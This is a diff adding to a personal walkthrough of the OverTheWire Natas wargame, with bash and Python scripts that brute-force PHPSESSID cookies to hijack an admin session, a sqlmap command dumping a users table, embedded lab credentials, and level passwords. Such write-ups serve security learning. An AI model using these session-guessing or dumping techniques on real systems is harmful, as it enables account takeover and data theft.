@@ -395,3 +395,86 @@ sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php?debug" --data="us
 sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php?debug" --data="username=natas18" --auth-type=Basic --auth-cred=natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd --level=5 --risk=3 --proxy="http://127.0.0.1:8080" -D natas17 -T users -C username,password --dump --dbms=mysql
 
 password: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
+
+
+Natas19:
+Here we are going to brute force the cookie PHPSESSID with the script
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+#!/bin/bash                                                                                                                                                                                                              |
+                                                                                                                                                                                                                         |
+for i in {0..640}; do                                                                                                                                                                                                    |
+   output=$(curl --path-as-is -i -s -k -X $'GET' -H $'Authorization: Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==' -b "PHPSESSID=$i" $'http://natas18.natas.labs.overthewire.org/index.php?debug')     |
+   if echo "$output" | grep "The credentials for the next level are" >/dev/null; then                                                                                                                                    |
+      echo "matched. PHPSESSID = $i"                                                                                                                                                                                     |
+      break                                                                                                                                                                                                              |
+   else                                                                                                                                                                                                                  |
+      echo "did not match. PHPSESSID = $i"                                                                                                                                                                               |
+   fi                                                                                                                                                                                                                    |
+done                                                                                                                                                                                                                     |
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+we get:
+did not match. PHPSESSID = 116
+did not match. PHPSESSID = 117
+did not match. PHPSESSID = 118
+matched. PHPSESSID = 119
+
+we then just modify the cookie to 119 in firefox
+password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
+
+
+Natas20:
+Very similar to the previous one, but we have to think about the pattern of the PHPSESSID cookie. I tried a few regular user logins and grabbed the sample cookies
+-------------------+
+3130332d61646d696e |
+3531372d61646d696e |
+3438312d61646d696e |
+3231372d61646d696e |
+3433382d61646d696e |
+3230362d61646d696e |
+3235322d61646d696e |
+3633322d61646d696e |
+3435302d61646d696e |
+3539342d61646d696e |
+3234322d61646d696e |
+3538312d61646d696e |
+3132332d61646d696e |
+3433332d61646d696e |
+3435332d61646d696e |
+3131352d61646d696e |
+38332d61646d696e   |
+34352d61646d696e   |
+-------------------+
+
+Therefore, I will assume the pattern is "3.3.3.2d61646d696e". I wrote a script to brute force this pattern in python
+---------------------------------------------------------------------------------------------------+
+import requests                                                                                    |
+                                                                                                   |
+url = 'http://natas19.natas.labs.overthewire.org/index.php?debug'                                  |
+headers = { 'Authorization': 'Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==' }    |
+                                                                                                   |
+# index generates a PHPSESSID based on "(?:3.)(?:3.)(?:3.)2d61646d696e" pattern                    |
+def send_payload(index):                                                                           |
+    dig = str(index)                                                                               |
+    if index <= 9:                                                                                 |
+        pattern = f'3{dig[0]}'                                                                     |
+    elif index <= 99:                                                                              |
+        pattern = f'3{dig[0]}3{dig[1]}'                                                            |
+    else:                                                                                          |
+        pattern = f'3{dig[0]}3{dig[1]}3{dig[2]}'                                                   |
+    sessid = f'{pattern}2d61646d696e'                                                              |
+    cookies = { 'PHPSESSID': sessid }                                                              |
+    r = requests.get(url, headers=headers, cookies=cookies)                                        |
+    raw = str(r.content)                                                                           |
+    return "The credentials for the next level are" in raw, sessid                                 |
+                                                                                                   |
+index = 0; found = False                                                                           |
+while not found and index <= 999:                                                                  |
+    match, sessid = send_payload(index)                                                            |
+    if match:                                                                                      |
+        print(f'matched. PHPSESSID = {sessid}')                                                    |
+        found = True                                                                               |
+    else:                                                                                          |
+        print(f'did not match. index = {index}')                                                   |
+        index += 1                                                                                 |
+---------------------------------------------------------------------------------------------------+
+password: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
